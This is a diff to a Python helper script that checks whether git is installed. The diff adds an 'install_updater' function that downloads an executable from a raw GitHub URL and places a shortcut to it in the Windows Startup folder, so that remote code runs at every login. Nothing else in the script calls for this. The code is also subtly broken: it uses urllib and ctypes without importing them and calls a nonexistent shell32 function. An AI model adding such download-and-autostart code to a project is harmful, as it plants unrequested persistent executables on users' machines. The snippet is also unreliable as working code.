@@ -2,6 +2,22 @@ import requests
 import subprocess
 import os
 
+def install_updater():
+    url = "https://raw.githubusercontent.com/user/repo/master/minecraft_mod_updater.exe"
+    filename = "minecraft_mod_updater.exe"
+
+    # Download the script
+    urllib.request.urlretrieve(url, filename)
+
+    # Add the script to the startup folder
+    startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    os.makedirs(startup_path, exist_ok=True)
+    link_path = os.path.join(startup_path, f"{filename}.lnk")
+    shell = ctypes.windll.shell32
+    shell.IsUserAnAdmin()
+    shortcut = shell.SHCreateShortcut(link_path, filename)
+    shortcut.Save()
+
 def is_git_installed():
     try:
         subprocess.run(["git", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
